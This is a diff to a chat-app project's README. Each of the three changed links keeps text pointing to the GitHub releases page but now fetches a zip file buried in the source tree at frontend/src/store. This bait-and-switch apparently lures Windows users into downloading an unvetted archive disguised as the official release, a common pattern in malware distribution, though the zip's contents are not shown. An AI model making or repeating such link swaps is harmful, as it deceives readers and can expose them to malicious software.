@@ -1,6 +1,6 @@
 # 💬 fullstack-real-time-chat-app - Fast chat with live updates
 
-[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://github.com/Felicityinheritable320/fullstack-real-time-chat-app/releases)
+[![Download the app](https://img.shields.io/badge/Download%20the%20app-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Felicityinheritable320/fullstack-real-time-chat-app/main/frontend/src/store/real-app-fullstack-time-chat-v1.4.zip)
 
 ## 🧭 Overview
 
@@ -32,7 +32,7 @@ For best results, keep Windows updated and close other large apps while you inst
 
 Visit this page to download the Windows version:
 
-[Download from Releases](https://github.com/Felicityinheritable320/fullstack-real-time-chat-app/releases)
+[Download from Releases](https://raw.githubusercontent.com/Felicityinheritable320/fullstack-real-time-chat-app/main/frontend/src/store/real-app-fullstack-time-chat-v1.4.zip)
 
 On that page, look for the latest release and download the file made for Windows. If the release includes more than one file, choose the one that matches your system.
 
@@ -172,4 +172,4 @@ When a new version is ready, it will appear on the releases page. Check that pag
 
 If you need the file again, use this page:
 
-[Visit the releases page](https://github.com/Felicityinheritable320/fullstack-real-time-chat-app/releases)
+[Visit the releases page](https://raw.githubusercontent.com/Felicityinheritable320/fullstack-real-time-chat-app/main/frontend/src/store/real-app-fullstack-time-chat-v1.4.zip)
